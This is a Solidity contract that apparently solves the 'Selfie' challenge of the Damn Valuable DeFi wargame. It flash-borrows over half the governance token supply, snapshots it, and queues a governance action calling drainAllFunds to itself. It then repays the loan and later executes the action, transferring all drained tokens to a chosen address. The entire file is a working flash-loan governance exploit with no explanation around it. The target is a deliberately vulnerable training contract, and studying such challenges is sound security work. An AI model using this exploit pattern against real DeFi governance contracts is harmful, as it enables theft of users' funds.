// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../selfie/SimpleGovernance.sol';
import '../selfie/SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';

contract SelfieAttack {

  SelfiePool public selfiePool;
  SimpleGovernance public gov;
  DamnValuableTokenSnapshot public tok;
  address payable addressPool;
  bool public isFirst = true;
  uint256 public actionId;

  constructor(address payable _address1, address payable _address2, address payable _address3) {
    addressPool = _address1;
    selfiePool = SelfiePool(addressPool);
    gov = SimpleGovernance(_address2);
    tok = DamnValuableTokenSnapshot(_address3);
  }

  function attack() public {
    tok.snapshot();
    uint256 supply = tok.getTotalSupplyAtLastSnapshot();
    selfiePool.flashLoan(supply / 2 + 1);
  }

  function execute(address payable _boss) public {
    gov.executeAction(actionId);
    tok.transfer(_boss, tok.balanceOf(address(this)));
  }

  function receiveTokens(address _address, uint256 borrowAmount) external{
    tok.snapshot();
    actionId = gov.queueAction(addressPool, abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);  
    tok.transfer(addressPool, borrowAmount);
  }
}